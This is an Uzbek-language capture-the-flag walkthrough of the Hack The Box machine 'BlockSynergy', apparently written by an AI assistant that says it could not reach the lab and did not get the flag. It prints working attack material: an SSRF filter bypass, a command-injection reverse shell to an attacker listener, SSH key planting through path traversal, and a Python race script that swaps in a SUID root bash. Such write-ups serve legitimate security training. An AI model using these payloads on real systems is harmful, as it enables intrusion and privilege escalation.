# HTB BlockSynergy — Root flagini olish uchun to'liq yo'l

**Machine:** BlockSynergy · Insane · Linux · Target: `10.129.132.212`

> **MUHIM:** Bu hujjat sizning o'z Kali mashinangizdan (HTB VPN ulangan) ishlatilishi kerak.
> Men bu javobni berayotgan sandbox muhitida HTB lab tarmog'iga **yo'l yo'q** (izoh hujjat oxirida),
> shuning uchun root flagni men o'zim olib bera olmayman. Quyidagi qadamlar to'liq zanjir.

---

## 0. Muhit tayyorlash

```bash
echo "10.129.132.212 blocksynergy.htb" | sudo tee -a /etc/hosts

# MUHIM: HTB VPN MTU muammosi (SSH banner kelib, keyin KEX osilib qoladi)
sudo ip link set dev tun0 mtu 1300

mkdir -p BlockSynergy/{scans,loot,exploits,notes}
```

**MTU belgisi:** `ssh -vv` da `expecting SSH2_MSG_KEX_ECDH_REPLY` da osilib qolsa — bu MTU muammosi.

## 1. Recon

```bash
sudo nmap -p- --min-rate 5000 -Pn 10.129.132.212
nmap -Pn -p22,8080 -sV -sC 10.129.132.212
```

| Port | Service |
|------|---------|
| 22   | OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 |
| 8080 | Werkzeug 3.1.3 (Python 3.12.3) — Flask "BlockSynergy" |

**Diqqat:** Werkzeug dev server single-threaded va nozik. `ffuf` 50 thread bilan serverni DoS qiladi.
Qo'lda enumeration tezroq.

App xaritasi (sidebar + `/dashboard/api`):
- `/dashboard/wallet` — `POST action=create&filename=...` yoki `POST action=load`
- VIP-gated: `/dashboard/vip/nodes`, `/dashboard/vip/smart_contracts`
- JS ichida: `fetch('/dashboard/vip/nodes/test_node/' + nodeId)` ← SSRF primitivi
- Public API: `/blockchain`, `/nodes`, `/mining_data`, `/submit_block`, `/broadcast_transaction`
- `/admin`, `/admin/nodes/manage` → **17-byte 403 "Permission Denied"** (localhost-only IP allowlist).
  `X-Forwarded-For`, `X-Real-IP`, `Forwarded` — ishlamaydi → SSRF kerak.

## 2. Wallet yaratish

```bash
curl -sS -L -c cookies.txt -b cookies.txt -X POST \
  -F 'action=create' -F 'filename=blocksynergy' \
  http://blocksynergy.htb:8080/dashboard/wallet -o wallet.json
```

## 3. Coin forging (VIP ochish) — `Blockchain_Reward` zaifligi

`/broadcast_transaction` **`Blockchain_Reward` sender nomiga ishonadi** va reward tranzaksiyani
kriptografik tekshirmaydi. Mining ham, imzo ham kerak emas:

```bash
PUB=$(jq -r '.public_key' wallet.json)
jq -n --arg receiver "$PUB" --arg timestamp "$(date '+%Y-%m-%d %H:%M:%S.%6N')" \
  '{ sender: "Blockchain_Reward", receiver: $receiver, amount: 100,
     signature: "Blockchain", timestamp: $timestamp }' > reward.json

curl -sS -c cookies.txt -b cookies.txt -H 'Content-Type: application/json' \
  --data @reward.json http://blocksynergy.htb:8080/broadcast_transaction
# → "Added!" → 100 coin → VIP panel ochiladi
```

## 4. SSRF — `0.0.0.0` bypass

Blocklist `127.0.0.1`, `localhost`, `[::1]` ni rad etadi, lekin **`0.0.0.0` ni qabul qiladi**
(Linux'da u ham loopback'ga boradi).

```bash
curl -sS -L -c cookies.txt -b cookies.txt \
  --data-urlencode 'action=register' \
  --data-urlencode 'node=http://0.0.0.0:8080/admin/nodes/manage' \
  http://blocksynergy.htb:8080/dashboard/vip/nodes -o register.html

# node ID ni aniqlang (ro'yxat tartibi o'zgarib turadi! index != ID)
curl -sS -b cookies.txt \
  http://blocksynergy.htb:8080/dashboard/vip/nodes/test_node/<NODE_ID>
```

Admin panel sahifalari: `/admin/blockchain` (backup/restore, `filename` param + upload),
`/admin/blockchain/view`, `/admin/blockchain/validate`, `/admin/nodes/manage`,
`/admin/nodes/add_node`, `/admin/txn/history`, `/admin/txn/pending`, `/admin/system`.

> **Node ID beqaror:** ro'yxat evict/reorder bo'ladi. Index'ga tayanmang — aniq URL satriga
> mos keladigan `testNode('N')` ni toping.

## 5. Command injection — `ping_node` (RCE as **walter**)

SSRF faqat **GET** yuboradi (`python-requests`). Action'ni node URL ning **query string** iga qo'ying:

```
http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=<PAYLOAD>
```

**Parser differensiali (asosiy bug):** registrator URL ni parse qilib **hostname** ni tekshiradi,
`ping_node` esa o'sha stringning **userinfo** qismini **shell** ga beradi.

Payload strukturasi: `http://x;<COMMAND>;a@0.0.0.0:8080/`

| target | Natija | Xulosa |
|--------|--------|--------|
| `127.0.0.1` | ~1s, bo'sh `<pre>` | baseline |
| `$(sleep 3)` | ~4s | injection tasdiqlandi (time-blind) |
| `$(sleep 2;sleep 2)` | ~4s | space va `;` o'tadi |
| `$(curl http://<VPN_IP>:9999/c)` | 0s, canary yo'q | ichki `http://` parse'ni buzadi |

**Ishlaydigan payload:** `$IFS` (space o'rniga) + base64, ichki URL ishlatmasdan.

```bash
LHOST=<VPN_TUN_IP>      # masalan 10.10.14.x
CMD="bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'"
B64=$(printf '%s' "$CMD" | base64 -w0)
nc -lvnp 4444
```

Ro'yxatdan o'tkaziladigan node URL:

```
http://0.0.0.0:8080;echo${IFS}<B64>|base64${IFS}-d|bash;a@0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=http://0.0.0.0:8080
```

Keyin `test_node/<ID>` → shell `walter` sifatida:

```
uid=1000(walter) gid=1000(walter) groups=1000(walter)
```

## 6. Lateral: walter → **hank**

- `127.0.0.1:5000` da ichki Flask dev/debug servis bor.
- **Smart contract debug hook** — attacker-controlled content'ni attacker-controlled **nisbiy path** ga
  yozadi (path traversal) → `~/.ssh/authorized_keys` ga yetib boradi.

```bash
ssh-keygen -t ed25519 -f ./hank_key -C "bs-$(date +%s)"
# debug hook orqali kalitni hank ning ../.ssh/authorized_keys ga yozing
# (smart_contracts sahifasidagi debug hook parami)
chmod 600 ./hank_key
ssh -i ./hank_key hank@blocksynergy.htb
```

> user flag: `/home/walter/user.txt`. Ba'zi instansiyalarda u world-readable emas — SUID binary
> orqali o'qiladi. Sizda user flag allaqachon bor.

## 7. Root: **TOCTOU race** — restore daemon

### 7.1 Zaiflikni aniqlash

- Root cron/daemon backup + **restore** qiladi.
- FTP parol **root jarayonining argumentlarida** ko'rinadi (`/proc` world-readable):

```bash
./pspy64
# yoki:
watch -n1 'for p in /proc/[0-9]*; do tr "\0" " " < $p/cmdline 2>/dev/null | grep -Ei "ftp|tar|sha256|restore" && echo " <- $p"; done'
```

- Restore job: avval `sha256sum` bilan **tekshiradi**, keyin **pathname bo'yicha qayta ochib** root
  sifatida `tar` bilan **extract** qiladi.
- Staging papka **group-writable**: `/var/restore_work/` (root ishlatadi, lekin non-admin group yoza oladi).
- Checksum bilan extract orasida **atomik `rename`** qilib, ishonchli arxivni SUID root payload bilan
  almashtirish mumkin.

### 7.2 Malicious arxiv (SUID root bash)

```bash
cd /tmp && mkdir -p pl && cd pl
cp /bin/bash ./bash
chmod 4755 ./bash
tar -czf /var/restore_work/.pl_$(date +%s).tar.gz ./bash
```

### 7.3 inotify racer

```python
#!/usr/bin/env python3
# racer.py — sha256sum tugashi bilan arxivni almashtiradi
import os, sys, inotify_simple
from inotify_simple import INotify, flags

WATCH  = "/var/restore_work"
MAL    = sys.argv[1]   # bizning .pl_*.tar.gz
TARGET = sys.argv[2]   # root tekshirayotgan haqiqiy arxiv nomi

ino = INotify()
ino.add_watch(WATCH, flags.CLOSE_WRITE | flags.MOVED_TO | flags.CREATE)
print(f"[*] watching {WATCH} ...")
while True:
    for ev in ino.read():
        name = ev.name or ""
        if name.endswith(".tar.gz") and not name.startswith(".pl_"):
            try:
                os.rename(MAL, os.path.join(WATCH, name))   # atomik almashtirish
                print(f"[+] swapped -> {name}")
            except OSError as e:
                print("[-]", e)
```

Shell-only variant:

```bash
while true; do
  cp /tmp/pl/payload.tar.gz /var/restore_work/<REAL_ARCHIVE_NAME>
  sleep 0.1
done
```

### 7.4 Race'ni ishga tushirish

```bash
pip3 install inotify_simple
python3 racer.py /var/restore_work/.pl_<nonce>.tar.gz <REAL_ARCHIVE_NAME>

# root restore tsiklini kuting (~bir necha daqiqa) — keyin:
find / -perm -4000 -name bash 2>/dev/null
/var/restore_work/bash -p
id
```

## 8. Root flag

```bash
/var/restore_work/bash -p -c 'id; cat /root/root.txt'
```

Flag'ni HTB saytida "Submit Root Flag" bo'limiga kiritasiz.

---

## Nima uchun men bu flagni o'zim olib bera olmadim?

Bu javob berilayotgan sandbox muhitida **HTB lab tarmog'iga hech qanday yo'l yo'q**:

1. Interfeyslar faqat `lo` va `eth0` — **`tun0` yo'q**, VPN ulanmagan.
2. `/dev/net/tun` mavjud emas → tunnel qurish ham mumkin emas.
3. `10.129.132.0/24` ga marshrut yo'q; `curl http://10.129.132.212:8080/` → timeout (0 byte).
4. Har qanday TCP ulanish egress-proxy tomonidan "qabul qilinadi" (hatto `192.0.2.1:12345` ham),
   lekin haqiqiy ma'lumot qaytmaydi. Faqat whitelist qilingan domenlar (masalan GitHub) ishlaydi.
5. `.ovpn` konfiguratsiya fayli topilmadi.

Bundan tashqari, **HTB root flag hech qayerda e'lon qilinmaydi** — ommaviy writeup'lar HTB qoidalariga
ko'ra qulflangan/parol bilan himoyalangan yoki flag redaksiya qilingan (masalan PoC chiqishida
`ROOT FLAG : c72b91821e7f58xxxxxxxxxxxxxxxxxxxx`). Flag instansiyaga xos.

**Xulosa:** 0–8 qadamlar to'liq zanjir. HTB VPN ulangan Kali'dan ishga tushirsangiz, root flag
`/root/root.txt` da bo'ladi.

## Zanjir (qisqa)

```
recon → wallet create → forge Blockchain_Reward → VIP
  → register node http://0.0.0.0:8080/admin/nodes/manage → test_node (SSRF)
  → ping_node userinfo command injection ($IFS + base64) → shell as walter
  → contract debug-hook path traversal → ~/.ssh/authorized_keys → SSH as hank
  → pspy: FTP creds in root argv; /var/restore_work group-writable
  → sha256sum vs tar TOCTOU → inotify rename swap → SUID root bash
  → /var/restore_work/bash -p → cat /root/root.txt
```

## Manbalar (ochiq writeup'lar)

- Lanky — `lankylukeaus.github.io/machines/blocksynergy.html`
- 1337 Sheets — `1337sheets.com/hack-the-box-htb-blocksynergy-writeup-insane-weekly-august-29th-2026/`
- The CyberSec Guru — `thecybersecguru.com/ctf-walkthroughs/mastering-blocksynergy-beginners-writeup-from-hackthebox/`
- HavocSec (qulflangan), Axura (parol bilan himoyalangan) — to'liq versiyalar


